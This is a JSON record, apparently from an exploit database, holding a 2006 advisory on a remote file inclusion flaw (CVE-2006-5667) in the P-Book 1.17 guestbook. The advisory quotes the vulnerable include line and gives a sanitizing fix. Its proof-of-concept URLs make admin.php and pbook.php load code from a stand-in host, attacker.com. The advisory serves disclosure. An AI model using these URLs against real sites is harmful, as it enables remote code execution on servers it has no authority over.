{
  "id": "2691",
  "title": "P-Book 1.17 - &#039;pb_lang&#039; Remote File Inclusion",
  "cve": "CVE-2006-5667",
  "vuln_type": "rce",
  "code": "____________________   ___ ___ ________\r\n\\_   _____/\\_   ___ \\ /   |   \\\\_____  \\\r\n |    __)_ /    \\  \\//    ~    \\/   |   \\\r\n |        \\\\     \\___\\    Y    /    |    \\\r\n/_______  / \\______  /\\___|_  /\\_______  /\r\n        \\/         \\/       \\/         \\/                              .OR.ID\r\nECHO_ADV_56$2006\r\n\r\n------------------------------------------------------------------------------\r\n[ECHO_ADV_56$2006] P-Book <= 1.17 (pb_lang) Remote File Inclusion\r\n------------------------------------------------------------------------------\r\n\r\nAuthor\t\t: Ahmad Maulana a.k.a Matdhule\r\nDate Found\t: October, 18th 2006\r\nLocation\t: Indonesia, Jakarta\r\nweb\t\t: http://advisories.echo.or.id/adv/adv56-matdhule-2006.txt\r\nCritical Lvl\t: Highly critical\r\nImpact\t\t: System access\r\nWhere\t\t: From Remote\r\n---------------------------------------------------------------------------\r\n\r\nAffected software description:\r\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n\r\n\r\nApplication\t: P-Book\r\nversion\t\t: 1.17\r\nURL\t\t: http://www.PPoPn.net\r\n\r\n---------------------------------------------------------------------------\r\n\r\nVulnerability:\r\n~~~~~~~~~~~~~~\r\n\r\nI found vulnerability script admin.php\r\n\r\n-----------------------admin.php----------------------\r\n....\r\n<?\r\n\r\n$time = $reload * 60;\r\ninclude(\"$pb_lang/language.php\");\r\n...\r\n----------------------------------------------------------\r\n\r\nInput passed to the \"pb_lang\" parameter in admin.php is not\r\nproperly verified before being used. This can be exploited to execute\r\narbitrary PHP code by including files from local or external\r\nresources.\r\n\r\nAlso affected files:\r\npbook.php\r\n\r\nProof Of Concept:\r\n~~~~~~~~~~~~~~~\r\n\r\nhttp://target.com/[p-book_path]/admin.php?pb_lang=http://attacker.com/inject.txt?\r\nhttp://target.com/[p-book_path]/pbook.php?pb_lang=http://attacker.com/inject.txt?\r\n\r\nSolution:\r\n~~~~~~~\r\n- Sanitize variable $pb_lang on affected files.\r\n\r\n---------------------------------------------------------------------------\r\nShoutz:\r\n~~~\r\n~ solpot a.k.a chris, J4mbi  H4ck3r thx for the hacking lesson    :)   \r\n~ y3dips,the_day,moby,comex,z3r0byt3,c-a-s-e,S`to,lirva32,anonymous\r\n~ bius, lapets, ghoz, t4mbun_hacker, NpR, h4ntu, thama\r\n~ newbie_hacker@yahoogroups.com, jasakom_perjuangan@yahoogroups.com\r\n~ Solpotcrew Comunity (#nyubicrew), #e-c-h-o @irc.dal.net\r\n------------------------------------------------------------------------\r\n---\r\nContact:\r\n~~~~\r\n \r\n     matdhule[at]gmail[dot]com\r\n     \r\n-------------------------------- [ EOF ]----------------------------------\r\n\r\n# milw0rm.com [2006-10-31]",
  "url": "https://www.exploit-db.com/exploits/2691"
}